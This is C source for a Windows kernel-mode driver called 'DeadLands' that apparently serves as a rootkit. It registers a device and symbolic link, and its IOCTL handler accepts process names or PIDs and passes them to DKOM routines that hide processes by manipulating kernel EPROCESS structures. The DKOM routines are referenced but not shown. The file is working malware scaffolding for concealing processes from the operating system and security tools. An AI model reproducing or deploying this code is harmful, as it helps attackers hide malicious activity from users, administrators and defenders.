#include <stdlib.h>
#include "ntddk.h"
#include "deadlands.h"

NTSTATUS	DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath)
{
	UNICODE_STRING		deadDriverName;
	UNICODE_STRING		deadDosDriverName;
	PDEVICE_OBJECT		pDeviceObject;
	NTSTATUS			retValue;
	unsigned int		i;
	
	DbgPrint("Welcome to DeadLands");
	DbgPrint("DeadLands Offset -> PID: 0x%X, ELIST: 0x%X, IMAGENAME: 0x%X", EPROCESS_OFFSET_PID, EPROCESS_OFFSET_ELIST, EPROCESS_OFFSET_IMAGENAME);
	RtlInitUnicodeString(&deadDriverName, L"\\Device\\DeadLands");
	RtlInitUnicodeString(&deadDosDriverName, L"\\DosDevices\\DeadLands");
	retValue = IoCreateDevice(pDriverObject, 0, &deadDriverName, FILE_DEVICE_DEADLANDS, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	if (NT_SUCCESS(retValue)) {
		// Assign deadlands functions to all MajorFunction
		for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
			pDriverObject->MajorFunction[i]	= DeadLands_NotImplemented;
		pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeadLands_IOCTL;
		pDriverObject->MajorFunction[IRP_MJ_CREATE] = DeadLands_Open;
		pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DeadLands_Close;
		pDriverObject->MajorFunction[IRP_MJ_READ] = DeadLands_Read;
		pDriverObject->MajorFunction[IRP_MJ_WRITE] = DeadLands_Write;
		pDriverObject->DriverUnload = CleanUp;
		
		// Create link to deadlands driver
		IoCreateSymbolicLink(&deadDosDriverName, &deadDriverName);
	}
	
	return (retValue);
}

void	CleanUp(IN PDRIVER_OBJECT pDriverObject)
{
	UNICODE_STRING	deadDosDriverName;

	DbgPrint("Just Leaving DeadLands");
	RtlInitUnicodeString(&deadDosDriverName, L"\\DosDevices\\DeadLands");
	IoDeleteSymbolicLink(&deadDosDriverName);
	IoDeleteDevice(pDriverObject->DeviceObject);
}

NTSTATUS	DeadLands_NotImplemented(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	return (STATUS_NOT_IMPLEMENTED);
}

NTSTATUS	DeadLands_Open(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("Open Function called");
	return (STATUS_SUCCESS);
}

NTSTATUS	DeadLands_Close(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("Close Function called");
	return (STATUS_SUCCESS);
}

NTSTATUS	DeadLands_Read(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("Read Function called");
	return (STATUS_SUCCESS);
}

NTSTATUS	DeadLands_Write(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("Write Function called");
	return (STATUS_SUCCESS);
}

NTSTATUS	DeadLands_IOCTL(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	NTSTATUS			retValue = STATUS_SUCCESS;
	PIO_STACK_LOCATION	pIoctl;
	PVOID				pBuffer;

	pIoctl = IoGetCurrentIrpStackLocation(pIrp);
	pBuffer = pIrp->AssociatedIrp.SystemBuffer;
	switch (pIoctl->Parameters.DeviceIoControl.IoControlCode) {
		case IOCTL_DEADLANDS_HIDE_NAME:
			DbgPrint("IOCTL_DEADLANDS_HIDE_NAME Value: %.*s", pIoctl->Parameters.DeviceIoControl.InputBufferLength, (char*)pBuffer);
			retValue = DKOM_HideProcessByName((char*)pBuffer, pIoctl->Parameters.DeviceIoControl.InputBufferLength);
			RtlZeroMemory(pBuffer, pIoctl->Parameters.DeviceIoControl.InputBufferLength);
			break;
		case IOCTL_DEADLANDS_HIDE_PID:
			DbgPrint("IOCTL_DEADLANDS_HIDE_PID Value: %ld", atol((char*)pBuffer));
			retValue = DKOM_HideProcessByPID(atol((char*)pBuffer));
			RtlZeroMemory(pBuffer, pIoctl->Parameters.DeviceIoControl.InputBufferLength);
			break;
		default:
			retValue = STATUS_NOT_SUPPORTED;
			break;
	}
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	
	return (retValue);
}
